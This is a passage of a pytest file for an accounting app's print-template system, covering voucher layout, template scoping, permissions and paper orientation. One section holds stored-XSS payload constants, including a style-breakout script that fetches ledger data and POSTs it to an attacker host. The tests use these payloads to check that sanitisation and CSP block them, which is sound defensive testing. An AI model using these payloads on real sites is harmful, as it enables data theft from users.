    make_voucher("2026-01-05",
                 dr=[("1001", 10, f"借{i}") for i in range(4)],
                 cr=[("5001", 10, f"贷{i}") for i in range(4)], posted=True)
    content = {"paper": "A4"}
    prev = client.post(f"/api/books/{book.id}/print/preview",
                       json={"scope": "VOUCHER", "content": content,
                             "period_id": periods[1].id}, headers=auth)
    tpl_id = client.post(f"/api/books/{book.id}/print/templates",
                         json={"scope": "VOUCHER", "name": "对照", "content": content},
                         headers=auth).json()["id"]
    printed = client.get(f"/api/books/{book.id}/print/vouchers.html",
                         params={"period_id": periods[1].id, "template_id": tpl_id},
                         headers=auth)

    def body(h):
        return h.split("<body>")[1].replace(
            '<p class="page-note">预览只显示前 3 张凭证，打印时输出该期间全部凭证。</p>', "")

    assert "记0001 - 002/002" in prev.text
    assert body(prev.text) == body(printed.text)


def test_行高固定且每行一致():
    """固定版式：表头 +（分录行 + 合计行）必须恰好占满表格。

    不能只写 height:100% 让浏览器自己分配 —— 它把余量塞给最后一行，
    合计行会变成一条肥带，空行又比有字的分录行矮胖不一。
    """
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    m = re.search(r"--vhead:([\d.]+)%;--vrow:([\d.]+)%", html)
    assert m, "表格没有给出行高变量"
    head, row = float(m.group(1)), float(m.group(2))
    assert head == 14
    # 5 行摘要 + 1 行合计
    assert abs(head + row * 6 - 100) < 0.01, (head, row)


def test_行数减小时行高同步变大():
    """行数少了，同一高度里分给每行的就要更多，否则表格撑不满。"""
    out = {}
    for n in (2, 5):
        tpl = validate_template("VOUCHER", {"voucher": {"rows_per_page": n}})
        html = render_voucher_sheet(tpl, {}, [_voucher(n=2)], 1, 1)
        head, row = (float(x) for x in re.search(
            r"--vhead:([\d.]+)%;--vrow:([\d.]+)%", html).groups())
        out[n] = head + row * (n + 1)
        assert abs(out[n] - 100) < 0.01
    assert out[2] > out[5] or out[2] == out[5]   # 都是 100%，行高本身才变大


def test_空行补齐到固定行数():
    """只有 2 条分录时也要补足 5 行，否则两张凭证叠在一起高度对不齐。"""
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_sheet(tpl, {}, [_voucher(n=2)], 1, 1)
    tbody = re.search(r"<tbody>(.*?)</tbody>", html, re.S).group(1)
    # 合计行是 <tr class="total">，所以按 "<tr" 数：2 条分录 + 3 个空行 + 1 合计行
    assert tbody.count("<tr") == 6


def test_借贷方金额按方向落到对应列():
    """分录只有 direction + amount，debit / credit 两列必须按方向取值。"""
    tpl = validate_template("VOUCHER", {})
    html = render_voucher_sheet(tpl, {}, [_voucher(n=2)], 1, 1)
    body = re.search(r"<tbody>(.*?)</tbody>", html, re.S).group(1)
    first, second = body.split("<tr>")[1], body.split("<tr>")[2]
    assert '<td class="num">10.00</td>' in first      # 第 1 行借方
    assert '<td class="num"></td>' in first           # 贷方留空，不重复印金额
    assert '<td class="num"></td>' in second          # 第 2 行贷方
    assert '<td class="num">10.00</td>' in second


def test_表格框线可单独关掉():
    """关框线只去线，表格结构和行高还得在 —— 凭证是固定版式，塌一块就废了。"""
    tpl = validate_template("VOUCHER", {"elements": [
        {"id": "t", "type": "table", "bind": "entries", "border": False,
         "x": 3, "y": 20, "w": 94, "h": 60},
    ]})
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    # 只看元素上的 class，别去全文找 "no-border" —— 样式表里本来就有这个词
    assert 'class="voucher-element table no-border"' in html
    assert html.count('<table class="grid"') == 1
    assert "--vrow:" in html                     # 行高照样算给行
    assert "摘　要" in html                        # 内容照印


# --------------------------------------------------------------------- 表头与合计行


def _table_tpl(**el):
    base = {"id": "t", "type": "table", "bind": "entries", "x": 3, "y": 20, "w": 94, "h": 60}
    return validate_template("VOUCHER", {"elements": [{**base, **el}]})


def test_表头默认显示():
    tpl = validate_template("VOUCHER", {})
    table_el = next(e for e in tpl["elements"] if e["type"] == "table")
    assert table_el["show_header"] is True
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    assert "<thead>" in html and "摘　要" in html


def test_表头可以关掉且高度让给分录行():
    """关掉表头不能塌一行 —— 剩下的高度全给分录行，表格还是占满原位。"""
    tpl = _table_tpl(show_header=False)
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    assert "<thead>" not in html
    head, row = (float(x) for x in re.search(
        r"--vhead:([\d.]+)%;--vrow:([\d.]+)%", html).groups())
    assert head == 0
    assert abs(head + row * 6 - 100) < 0.01
    # 分录 5 行 + 合计行，正文照旧
    assert html.count("<tr") >= 6


def test_表头高度可配():
    tpl = _table_tpl(header_height=25)
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    head, row = (float(x) for x in re.search(
        r"--vhead:([\d.]+)%;--vrow:([\d.]+)%", html).groups())
    assert head == 25
    assert abs(head + row * 6 - 100) < 0.01
    assert "摘　要" in html


def test_表头高度越界被夹住():
    tpl = _table_tpl(header_height=999)
    assert tpl["elements"][0]["header_height"] == 100
    tpl2 = _table_tpl(header_height="不是数字")
    assert tpl2["elements"][0]["header_height"] == 14


def test_合计文字可配():
    """合计行那个标签归模板管，不写就还是「合　计」。"""
    assert "合　计" in render_voucher_sheet(_table_tpl(), {}, [_voucher()], 1, 1)
    html = render_voucher_sheet(_table_tpl(total_label="本页合计"), {}, [_voucher()], 1, 1)
    assert "本页合计" in html and "合　计" not in html


def test_合计文字可以留空():
    html = render_voucher_sheet(_table_tpl(total_label=""), {}, [_voucher()], 1, 1)
    body = re.search(r"<tbody>(.*?)</tbody>", html, re.S).group(1)
    total_row = [r for r in body.split("<tr") if "total" in r][0]
    assert "合" not in total_row


def test_表格默认有框线():
    tpl = validate_template("VOUCHER", {})
    table_el = next(e for e in tpl["elements"] if e["type"] == "table")
    assert table_el["border"] is True
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    assert 'class="voucher-element table no-border"' not in html
    assert 'class="voucher-element table"' in html


# ===================================================================== P0-2 模板存储型 XSS
#
# 攻击链四环：
#   ① font.family / title.align / title.size / subtitle.align / subtitle.size
#      未经校验直接拼进 _page_css 生成的 <style>；
#   ② validate_template 只校验纸型/页边距/列 align/line_width/line_style，
#      上述五处一个都没管；
#   ③ print_template 没有 book_id —— 模板是全局的；
#   ④ 打印页只挂 get_my_book，VIEWER 也会渲染这张全局模板。
#
# 前两环在这里用**单元测试**钉死（③④ 属于 API 与数据模型层，
# 见 test_打印模板写权限只认全局门禁）。下面的用例构造真实攻击载荷，
# 断言它既过不了校验、也进不了渲染结果。


#: 审查报告里的原始攻击载荷：闭合 font-family 的引号 → 闭合 style →
#: 跨出 <style> 执行脚本 → 再开一个 <style> 把文档接回去（看起来完全正常）。
XSS_FONT_FAMILY = (
    '宋体"; } </style><script>fetch("/api/books/B/ledger/general?period_id=1")'
    '.then(r=>r.text()).then(t=>fetch("http://attacker",{method:"POST",body:t}))'
    '</script><style> body{'
)
#: align / size 是**无引号**拼接，比 font-family 更好利用：连闭合引号都不需要。
XSS_ALIGN = "center; } </style><script>alert(1)</script><style> .x{"
XSS_SIZE = "16; } </style><script>alert(2)</script><style> .y{"


def test_恶意字体名被白名单挡下():
    tpl = validate_template("VOUCHER", {"font": {"family": XSS_FONT_FAMILY}})
    assert tpl["font"]["family"] == "宋体"


def test_白名单内的字体名照常保留():
    """不能为了防注入把字体写死 —— 设计器本来就让人选。"""
    for name in ("黑体", "楷体", "仿宋", "微软雅黑", "Times New Roman"):
        assert validate_template("VOUCHER", {"font": {"family": name}})["font"]["family"] == name


def test_恶意标题对齐被白名单挡下():
    tpl = validate_template("VOUCHER", {"title": {"align": XSS_ALIGN}})
    assert tpl["title"]["align"] == "center"


def test_恶意标题字号被夹回区间():
    tpl = validate_template("VOUCHER", {"title": {"size": XSS_SIZE}})
    assert isinstance(tpl["title"]["size"], float)
    assert 8 <= tpl["title"]["size"] <= 48


def test_恶意副标题对齐和字号被挡下():
    tpl = validate_template("VOUCHER",
                            {"subtitle": {"align": XSS_ALIGN, "size": XSS_SIZE}})
    assert tpl["subtitle"]["align"] == "center"
    assert 8 <= tpl["subtitle"]["size"] <= 48


def test_字号超出区间被夹住():
    assert validate_template("VOUCHER", {"font": {"size": 9999}})["font"]["size"] == 24
    assert validate_template("VOUCHER", {"font": {"size": -3}})["font"]["size"] == 6


def test_页边距超区间被夹住():
    """页边距注入不进（float 兜底），但负数/超大值会让整页空白或错位。"""
    m = validate_template("VOUCHER", {"margins": {"top": -50, "left": 9999}})["margins"]
    assert m["top"] == 0
    assert m["left"] == 100


def test_元素坐标和线宽不收垃圾值():
    """元素的 x/y/w/h/line_width 会拼进 style 属性，同样只收区间内的数。"""
    els = validate_template("VOUCHER", {"elements": [
        {"type": "line", "x": "nan", "y": "inf", "w": "abc",
         "line_width": "999", "line_style": "url(evil)"},
    ]})["elements"]
    assert els[0]["x"] == 5 and els[0]["y"] == 5      # NaN/Infinity 退回默认
    assert 1 <= els[0]["w"] <= 100
    assert els[0]["line_width"] == 3                  # 夹上界
    assert els[0]["line_style"] == "solid"           # 非白名单退回 solid


def test_攻击载荷渲染后不含脚本():
    """端到端：存进去的恶意模板渲染出来必须没有 <script>。"""
    tpl = validate_template("VOUCHER", {
        "font": {"family": XSS_FONT_FAMILY, "size": 10},
        "title": {"align": XSS_ALIGN, "size": XSS_SIZE},
        "subtitle": {"align": XSS_ALIGN, "size": XSS_SIZE},
    })
    for html in (render_voucher_sheet(tpl, {}, [_voucher()], 1, 1),
                 render_table_page(tpl, {}, [], 1, 1)):
        assert "<script" not in html
        assert "alert(1)" not in html and "alert(2)" not in html
        assert "fetch(" not in html


def test_未校验的脏模板渲染时也不出脚本():
    """**防御纵深**：模板可能来自校验逻辑上线之前的老数据，或有人直接改库。

    这里**完全绕过 validate_template**，直接把脏字典喂给渲染器：
    渲染层不能假设自己拿到的字典是干净的。
    """
    from app.printing.template import _page_css

    dirty = {
        "paper": "A4",
        "margins": {"top": -5, "right": "</style><script>alert(1)</script>"},
        "font": {"family": XSS_FONT_FAMILY, "size": XSS_SIZE},
        "title": {"align": XSS_ALIGN, "size": XSS_SIZE},
        "subtitle": {"align": XSS_ALIGN, "size": XSS_SIZE},
        "columns": [{"key": "label", "label": "x", "width": 10, "align": "left"}],
        "body": {},
    }
    css = _page_css(dirty)
    assert "<script" not in css and "</style>" not in css and "alert(" not in css


def test_打印页带CSP且禁脚本():
    """第二道防线：即便载荷绕过校验进了文档，CSP 也不让它执行。

    meta 标签而不是只靠响应头 —— 前端是 axios 取回源码再 srcdoc /
    document.write，走这条链路时响应头会全部丢失。
    """
    tpl = validate_template("VOUCHER", {})
    for html in (render_voucher_sheet(tpl, {}, [_voucher()], 1, 1),
                 render_table_page(tpl, {}, [], 1, 1)):
        assert 'http-equiv="Content-Security-Policy"' in html
        assert "script-src 'none'" in html
        assert "style-src 'unsafe-inline'" in html   # 内联样式是模板引擎的固有要求


def test_多页打印只包含一个文档头且保留各页内容():
    tpl = validate_template("VOUCHER", {})
    pages = [render_voucher_sheet(tpl, {}, [_voucher()], page, 3) for page in range(1, 4)]
    html = wrap_pages(pages, "预览 <3> 张")
    head, body = html.split("</head>", 1)
    assert html.count("<!DOCTYPE html>") == 1
    assert html.count("<head>") == 1
    assert html.count("<body>") == 1
    assert head.count('http-equiv="Content-Security-Policy"') == 1
    assert "Content-Security-Policy" not in body
    assert body.count('<div class="page">') == 3
    assert body.count('<p class="page-note">') == 1
    assert "预览 &lt;3&gt; 张" in body
    assert wrap_pages(pages[:1]) == pages[0]


def test_CSP不破坏内联样式和打印():
    """CSP 不能把版式打掉：内联 <style> 必须仍被放行。"""
    tpl = validate_template("VOUCHER", {"font": {"family": "黑体", "size": 12}})
    html = render_voucher_sheet(tpl, {}, [_voucher()], 1, 1)
    assert "<style>" in html and "@page" in html
    assert "黑体" in html


# ------------------------------------------------------------ P1-5 全局模板写门禁


def _create_template(client, headers, book_id, **kw):
    body = {"scope": "VOUCHER", "name": "模板", "content": {}}
    body.update(kw)
    return client.post(f"/api/books/{book_id}/print/templates", json=body, headers=headers)


def test_会计不能改全局打印模板(client, db, book, plain_user, plain_auth):
    """模板是全局的，写门禁不能只看「当前账套能不能写」。

    过去只挂 require_book_write，于是在 A 账套是会计的人能改掉
    **B 账套只读用户正在渲染的**默认模板 —— 这正是 P0-2 的爆炸半径。
    """
    from app.models import UserBook

    db.add(UserBook(user_id=plain_user.id, book_id=book.id, role="ACCOUNTANT"))
    db.commit()
    r = _create_template(client, plain_auth, book.id)
    assert r.status_code == 403, f"会计竟然能改全局模板：{r.status_code} {r.text}"


def test_负责人和管理员仍能改全局模板(client, db, book, plain_user, plain_auth, auth):
    """收紧不能把账锁死：OWNER 与管理员必须还能改。"""
    from app.models import UserBook

    db.add(UserBook(user_id=plain_user.id, book_id=book.id, role="OWNER"))
    db.commit()
    assert _create_template(client, plain_auth, book.id).status_code == 201

    r = client.post(f"/api/books/{book.id}/print/templates",
                    json={"scope": "VOUCHER", "name": "管理员模板", "content": {}},
                    headers=auth)
    assert r.status_code == 201, r.text


def test_会计改不了已有全局模板(client, db, book, plain_user, plain_auth, auth):
    """PUT / DELETE / copy 三条写路径同样要挡。"""
    from app.models import UserBook

    created = _create_template(client, auth, book.id)
    assert created.status_code == 201
    tid = created.json()["id"]

    db.add(UserBook(user_id=plain_user.id, book_id=book.id, role="ACCOUNTANT"))
    db.commit()
    for method, path in (
        ("put", f"/api/books/{book.id}/print/templates/{tid}"),
        ("delete", f"/api/books/{book.id}/print/templates/{tid}"),
        ("post", f"/api/books/{book.id}/print/templates/{tid}/copy"),
    ):
        r = client.request(method, path, json={"content": {}}, headers=plain_auth)
        assert r.status_code == 403, f"{method} {path} -> {r.status_code}"


# ------------------------------------------------------------ P1-22 舍入模式一致性


@pytest.mark.parametrize(
    "raw,want",
    [
        # 与 accounting/util.py::money（ROUND_HALF_UP）对齐。
        # 用默认的 ROUND_HALF_EVEN 会得到 0.12 / 1.00，与账上的 0.13 / 1.01 对不上：
        # 小写合计写 0.13、大写印「壹角贰分」，同一张凭证自相矛盾。
        ("0.125", "零元壹角叁分"),
        ("1.005", "壹元零角壹分"),
        ("-0.005", "负零元壹分"),
        ("2.675", "贰元陆角捌分"),
    ],
)
def test_大写金额用四舍五入而不是银行家舍入(raw, want):
    assert to_cn_capital(raw) == want

# ------------------------------------------------ P1-5 模板作用域接线（book_id）
#
# 迁移（0005/0007）给 ``print_template`` 加了 ``book_id``（NULL = 全局兜底），
# 但在那之前 ``_template`` 取的是「该 scope 下**最早创建**的默认模板」，
# 不管它属于谁：一张全局模板会流进每一个账套的打印页。这组用例钉的是
# 「本账套优先、全局兜底」这条取用口径，以及跨账套按 id 取用/写入被拒。
#
# 断言方式刻意选在**渲染结果**上，而不是直接查 ``_template`` 返回了哪一行：
# 直接断言会让用例与实现耦合，而「这个账套打出来的到底是哪张模板」才是
# 真正要紧的那件事（模板内容会进 ``<style>``，见 P0-2）。


def _mk_book_as(client, headers, name=None) -> int:
    # 名字必须每次不同：走接口建的账套是**提交**的，夹具的 rollback 撤不回来，
    # 固定名字会在同一套件里撞上「同名账套已存在」。
    import uuid

    name = name or f"作用域{uuid.uuid4().hex[:8]}"
    r = client.post("/api/books", headers=headers,
                    json={"company_name": name, "name": name, "start_year": 2026})
    assert r.status_code == 201, r.text
    return r.json()["id"]


def _mk_template(db, *, book_id, scope, name, title, is_default=True) -> int:
    """造一条默认模板并返回 id。``title`` 会出现在 ``<h1 class="doc-title">`` 里，
    用来反查「打出来的到底是哪一张」。

    ``book_id=None`` 就是「全局兜底」——迁移之前的存量数据全是这个形状。
    """
    from app.models import PrintTemplate
    from app.printing.template import validate_template

    content = validate_template(scope, {"title": {"text": title}})
    t = PrintTemplate(book_id=book_id, scope=scope, name=name,
                      paper=content.get("paper", "A4"), content=content,
                      is_default=is_default)
    db.add(t)
    db.commit()
    db.refresh(t)
    return t.id


def _printed(client, headers, book_id, scope="balance.html") -> str:
    """打一份出来看用的是哪张模板。

    ``scope`` 是打印页的文件名（``balance.html`` / ``vouchers.html`` …）——
    模板的 title 会落在 ``<h1 class="doc-title">`` 或凭证抬头里，断言就认它。
    """
    r = client.get(f"/api/books/{book_id}/print/{scope}", headers=headers)
    assert r.status_code == 200, r.text
    return r.text


def test_明确选择内置版式不被账套默认模板替换(client, db, auth, book):
    _mk_template(db, book_id=book.id, scope="BALANCE", name="自定义默认", title="CUSTOM-DEFAULT")
    assert "CUSTOM-DEFAULT" in _printed(client, auth, book.id)
    r = client.get(f"/api/books/{book.id}/print/balance.html", headers=auth,
                   params={"template_id": 0})
    assert r.status_code == 200, r.text
    assert "CUSTOM-DEFAULT" not in r.text
    assert DEFAULT_TEMPLATES["BALANCE"]["title"]["text"] in r.text


def test_本账套模板优先_全局模板只做兜底(client, db, auth, book):
    """两个账套各有各的默认模板，各打各的；全局的那张谁也不取。

    特意让全局模板的 id **最小** —— 旧口径「最早创建的默认模板」在这种数据
    下必然取错，两张本账套的都会被它顶掉。
    """
    other = _mk_book_as(client, auth)
    glob = _mk_template(db, book_id=None, scope="BALANCE", name="全局版式",
                        title="GLOBAL-TPL")
    mine = _mk_template(db, book_id=book.id, scope="BALANCE", name="A 版式",
                        title="BOOK-A-TPL")
    theirs = _mk_template(db, book_id=other, scope="BALANCE", name="B 版式",
                          title="BOOK-B-TPL")
    assert glob < min(mine, theirs), "全局模板必须是 id 最大的那条才对，旧口径才取不到"

    a = _printed(client, auth, book.id)
    assert "BOOK-A-TPL" in a and "GLOBAL-TPL" not in a, "A 账套取的不是自己的默认模板"
    b = _printed(client, auth, other)
    assert "BOOK-B-TPL" in b and "GLOBAL-TPL" not in b, "B 账套取的不是自己的默认模板"


def test_只有全局模板的老数据_仍然打得出来(client, db, auth, book):
    """迁移前的存量模板全是 ``book_id IS NULL``：它必须继续能用。

    升级不能把老账套的版式弄丢 —— 所以它是「兜底」而不是「废弃」。
    但一旦本账套有了自己的默认模板，就轮不到它了。
    """
    _mk_template(db, book_id=None, scope="BALANCE", name="全局版式", title="GLOBAL-TPL")
    assert "GLOBAL-TPL" in _printed(client, auth, book.id)

    _mk_template(db, book_id=book.id, scope="BALANCE", name="A 版式", title="BOOK-A-TPL")
    assert "BOOK-A-TPL" in _printed(client, auth, book.id)


def test_跨账套的模板按_id_取不到(client, db, auth, book):
    """``template_id`` 是前端传来的任意整数，**不是授权凭据**。"""
    other = _mk_book_as(client, auth)
    theirs = _mk_template(db, book_id=other, scope="BALANCE", name="B 版式",
                          title="BOOK-B-TPL")

    r = client.get(f"/api/books/{book.id}/print/balance.html?template_id={theirs}",
                   headers=auth)
    assert r.status_code == 404, f"拿着别的账套的模板 id 打出了东西：{r.status_code}"

    d = client.get(f"/api/books/{book.id}/print/templates/{theirs}", headers=auth)
    assert d.status_code == 404, d.text


def test_跨账套改不了别人的模板(client, db, auth, book):
    """写路径同样要按账套收 —— 否则 book_id 只是个摆设。"""
    other = _mk_book_as(client, auth)
    theirs = _mk_template(db, book_id=other, scope="BALANCE", name="B 版式",
                          title="BOOK-B-TPL")

    for method, path in (
        ("put", f"/api/books/{book.id}/print/templates/{theirs}"),
        ("delete", f"/api/books/{book.id}/print/templates/{theirs}"),
        ("post", f"/api/books/{book.id}/print/templates/{theirs}/copy"),
    ):
        r = client.request(method, path, json={"name": "被改了"}, headers=auth)
        assert r.status_code == 404, f"{method} {path} -> {r.status_code}"

    still = client.get(f"/api/books/{other}/print/templates/{theirs}", headers=auth)
    assert still.status_code == 200 and still.json()["name"] == "B 版式"


def test_新建的模板归属当前账套(client, db, auth, book):
    from app.models import PrintTemplate

    r = client.post(f"/api/books/{book.id}/print/templates", headers=auth,
                    json={"scope": "BALANCE", "name": "新建", "content": {}})
    assert r.status_code == 201, r.text
    t = db.get(PrintTemplate, r.json()["id"])
    assert t is not None and t.book_id == book.id, "新建的模板没有归属到账套"


def test_设为默认_不会清掉别的账套的默认模板(client, db, auth, book):
    """``_clear_other_defaults`` 必须按 ``(book_id, scope)`` 分组。

    旧实现只按 scope 清，于是 A 账套「设为默认」会把 B 账套的默认模板一起
    降级 —— 表现是「在 A 账套点一下，B 账套的版式就悄悄变回去了」。
    """
    from app.models import PrintTemplate

    other = _mk_book_as(client, auth)
    old = _mk_template(db, book_id=book.id, scope="BALANCE", name="A 旧默认",
                       title="BOOK-A-OLD")
    theirs = _mk_template(db, book_id=other, scope="BALANCE", name="B 默认",
                          title="BOOK-B-TPL")

    r = client.put(f"/api/books/{book.id}/print/templates/{old}", headers=auth,
                   json={"is_default": False})
    assert r.status_code == 200, r.text
    _mk_template(db, book_id=book.id, scope="BALANCE", name="A 新默认", title="BOOK-A-NEW")

    db.expire_all()
    b = _printed(client, auth, other)
    assert "BOOK-B-TPL" in b, "A 账套「设为默认」把 B 账套的默认模板一起清掉了"
    a = _printed(client, auth, book.id)
    assert "BOOK-A-NEW" in a
    assert db.get(PrintTemplate, theirs).is_default is True


# --------------------------------------------------------------------- 打印时临时改纸型
#
# ``paper`` / ``orientation`` 回答的是「**这一次**打印用哪张纸」，不是
# 「把模板改成哪张纸」。临时换纸是常事 —— 打一张 A4 给领导签字，再打 A5 存进
# 凭证册第二层；而为这个去改默认模板，等于把整本账的默认纸型都换掉，之后
# 每一次正常打印都得记得改回来。改回来这件事必然有人忘。


def _page_size(doc: str) -> str:
    """从打印页里取出 ``@page { size: … }`` 里的那一段。"""
    return re.search(r"@page \{ size: ([^;]+);", doc).group(1)


def test_打印端点已经不再认纸型参数(client, auth, book):
    """纸型只剩 A4 之后，``?paper=`` 就是一个没人读的参数。

    行为上刻意**不报错**：老书签、老邮件里的打印链接多半带着它，直接 400
    会让「点开上周那封邮件里的链接」从「打出一张 A4」变成「打不开」。静默
    忽略的代价只是拿到 A4 —— 而 A4 本来就是唯一能拿到的纸，没有第二种结果
    会和用户按下的按钮对不上。这里把这条行为钉住，免得哪天有人「顺手」
    把它改成 400，或反过来把 paper 偷偷接回去。
    """
    url = f"/api/books/{book.id}/print/balance.html"
    for paper in ("B5", "A5", "A3", "泰坦纸"):
        r = client.get(url, params={"paper": paper, "orientation": "portrait"},
                       headers=auth)
        assert r.status_code == 200, (paper, r.text)
        assert _page_size(r.text) == "A4", paper


def test_改方向纵向横向互换(client, auth, book):
    """纵向模板转横向，以及转回来。

    **基线模板默认是横向**（2026-10-22 需求方自己调的那一份），
    所以这里从横向起步，再切回纵向。
    """
    url = f"/api/books/{book.id}/print/general-ledger.html"
    assert _page_size(client.get(url, headers=auth).text) == "A4 landscape"
    assert _page_size(client.get(url, params={"orientation": "portrait"},
                                 headers=auth).text) == "A4"
    assert _page_size(client.get(url, params={"orientation": "landscape"},
                                 headers=auth).text) == "A4 landscape"


def test_老纸型的模板存下来就是A4(client, auth, book):
    """老数据里存着 B5/A3 的模板，保存时归一成 A4 —— 界面上不再有第二个选项，
    留着旧值只会让「用户看到的」和「纸上出来的」对不上。"""
    for old in ("B5", "A3", "CONTINUOUS"):
        tpl_id = client.post(f"/api/books/{book.id}/print/templates",
                             json={"scope": "BALANCE", "name": f"老{old}",
                                   "content": {"paper": old}},
                             headers=auth).json()["id"]
        stored = client.get(f"/api/books/{book.id}/print/templates/{tpl_id}",
                            headers=auth).json()
        assert stored["content"]["paper"] == "A4", old
        assert stored["paper"] == "A4", old          # 冗余的那一列也得跟上
        printed = client.get(f"/api/books/{book.id}/print/balance.html",
                             params={"template_id": tpl_id}, headers=auth)
        # 资产负债表的内置基线是横版，所以这里只断言纸型那一半
        # （纵向是 "A4"，横向是 "A4 landscape" —— 方向归这条用例管不着）。
        assert _page_size(printed.text).split(" ")[0] == "A4", old


def test_未知纸型当场报错而不是悄悄退回A4(client, auth, book):
    """退化会让「我明明选了泰坦纸」和实际拿到的纸对不上，必须当场说清楚。

    纸型已经不让人选了，但**坏数据照样拒**：存进来一个认不出的纸名并让它
    静默变成 A4，等于把「这个人配错了」变成「没人知道」。与 font.family
    走白名单是同一条理由。
    """
    r = client.post(f"/api/books/{book.id}/print/templates",
                    json={"scope": "BALANCE", "name": "泰坦纸",
                          "content": {"paper": "泰坦纸"}},
                    headers=auth)
    assert r.status_code == 400
    assert "未知纸型" in r.json()["detail"]
    names = [t["name"] for t in
             client.get(f"/api/books/{book.id}/print/templates", headers=auth).json()]
    assert "泰坦纸" not in names, "报错了就不该留下半条数据"


def test_未知方向报错(client, auth, book):
    r = client.get(f"/api/books/{book.id}/print/balance.html",
                   params={"orientation": "diagonal"}, headers=auth)
    assert r.status_code == 400
    assert "不支持的方向" in r.json()["detail"]


def test_横竖由orientation说了算(client, auth, book):
    """纸名不再有话语权：横竖只看 orientation。"""
    url = f"/api/books/{book.id}/print/balance.html"
    assert _page_size(client.get(url, headers=auth).text) == "A4 landscape"
    for orient in ("portrait", "landscape"):
        r = client.get(url, params={"paper": "A4_LANDSCAPE", "orientation": orient},
                       headers=auth)
        assert r.status_code == 200, r.text
        assert _page_size(r.text) == ("A4" if orient == "portrait"
                                      else "A4 landscape"), orient


def test_临时改方向不写库_下一次打印拿回原来的方向(client, auth, book):
    """临时覆盖最怕的是「换着换着把模板换了」—— 存起来的那份必须纹丝不动。"""
    tpl_id = client.post(f"/api/books/{book.id}/print/templates",
                         json={"scope": "BALANCE", "name": "账套横版",
                               "content": {"orientation": "landscape"}},
                         headers=auth).json()["id"]
    params = {"template_id": tpl_id}

    printed = client.get(f"/api/books/{book.id}/print/balance.html",
                         params={**params, "orientation": "portrait"}, headers=auth)
    assert _page_size(printed.text) == "A4"

    again = client.get(f"/api/books/{book.id}/print/balance.html",
                       params=params, headers=auth)
    assert _page_size(again.text) == "A4 landscape"        # 没被改掉
    stored = client.get(f"/api/books/{book.id}/print/templates/{tpl_id}", headers=auth).json()
    assert stored["content"]["orientation"] == "landscape"


def test_凭证每页张数由模板的slots_per_page决定(client, auth, book, periods,
                                          make_voucher):
    """同样是 A4，一张凭证一页和两张凭证一页都合法 —— 差别只在模板里那一个字段。

    这不是顺带发生的副作用，是这张纸本来就能放几张：一张纸硬塞两张，
    打出来就是两张叠在一起，谁也读不了。所以「放几张」必须由模板自己说，
    而不能再从纸型推（纸型已经恒为 A4，推出来永远是 2）。
    """
    make_voucher("2026-01-05", dr=[("1001", 10, "x")], cr=[("5001", 10, "x")],
                 posted=True)
    make_voucher("2026-01-06", dr=[("1001", 20, "y")], cr=[("5001", 20, "y")],
                 posted=True)
    url = f"/api/books/{book.id}/print/vouchers.html"
    period = {"period_id": periods[1].id}

    def pages(content: dict) -> int:
        tpl_id = client.post(f"/api/books/{book.id}/print/templates",
                             json={"scope": "VOUCHER", "name": "T",
                                   "content": content, "private": True},
                             headers=auth).json()["id"]
        r = client.get(url, params={**period, "template_id": tpl_id}, headers=auth)
        assert r.status_code == 200, r.text
        return r.text.count('<div class="page">')

    assert pages({"voucher": {"slots_per_page": 2}}) == 1     # 两张凭证挤一页
    assert pages({"voucher": {"slots_per_page": 1}}) == 2     # 一页一张 → 两张纸
    # 老模板（存的是 A5）在校验时就归一成 A4 + 一页一张：内容一个字节没改，
    # 印出来的张数不能变 —— 否则这就是一次静默的版式变更。
    assert pages({"paper": "A5"}) == 2


def test_不给方向时原样返回同一个对象():
    """不复制 —— 「为了打印而凭空多一份字典」是没人看得见的开销。"""
    from app.api.printing import _with_orientation
    from app.printing.template import validate_template

    tpl = validate_template("VOUCHER", {})
    assert _with_orientation(tpl, None) is tpl


def test_覆盖只改副本不动模板本身():
    from app.api.printing import _with_orientation
    from app.printing.template import validate_template

    tpl = validate_template("VOUCHER", {"orientation": "portrait"})
    out = _with_orientation(tpl, "landscape")
    assert out["orientation"] == "landscape"
    assert tpl["orientation"] == "portrait"        # 模板本身没被动过


def test_纸型不存在临时覆盖这回事():
    """``_with_orientation`` 不接受纸型 —— 只有一个能临时改的维度，
    就只留一个口子。给两个参数会静默忽略其中一个，那才是 bug 的形状。"""
    import inspect

    from app.api.printing import _with_orientation

    assert list(inspect.signature(_with_orientation).parameters) == ["tpl", "orientation"]
    assert not hasattr(__import__("app.api.printing", fromlist=["x"]), "_with_paper")


# ------------------------------------------------------------- 科目层级路径


def test_科目路径按父子链拼到末级():
    """路径靠 parent_id 往上走，不是拿编码的分隔符换斜杠。"""
    from types import SimpleNamespace

    from app.api.printing import _subject_paths

    subs = {
        1: SimpleNamespace(id=1, name="银行存款", parent_id=None),
        2: SimpleNamespace(id=2, name="星悦荟基本户", parent_id=1),
        3: SimpleNamespace(id=3, name="泉州银行东海支行", parent_id=2),
        9: SimpleNamespace(id=9, name="孤立科目", parent_id=None),
    }
    paths = _subject_paths(subs)
    assert paths[1] == "银行存款"
    assert paths[2] == "银行存款/星悦荟基本户"
    assert paths[3] == "银行存款/星悦荟基本户/泉州银行东海支行"
    assert paths[9] == "孤立科目"


def test_科目路径遇到自环不死循环():
    """parent_id 指回自己（脏数据）时不能把打印页卡死。"""
    from types import SimpleNamespace

    from app.api.printing import _subject_paths

    subs = {1: SimpleNamespace(id=1, name="自己", parent_id=1)}
    assert _subject_paths(subs)[1] == "自己"


def test_科目路径查不到时退回科目名():
    from app.api.printing import _attach_subject_paths

    voucher = {"entries": [{"subject_id": 7, "subject_name": "基本户"},
                           {"subject_id": None, "subject_name": ""}]}
    out = _attach_subject_paths(voucher, {7: "银行存款/基本户"})
    assert out["entries"][0]["subject_path"] == "银行存款/基本户"
    assert out["entries"][1]["subject_path"] == ""



# --------------------------------------- 按用户隔离的私有副本（迁移 0023）
#
# 基线（迁移 0022 种下的那两份）人人可见，也人人可改 —— 但**改动只属于改的
# 那一个人**：写路径先把基线整份复制成 ``user_id = 当前用户`` 的私有副本，改动
# 落在副本上，基线一个字节都不动（见 ``api/printing.py::update_template``）。
#
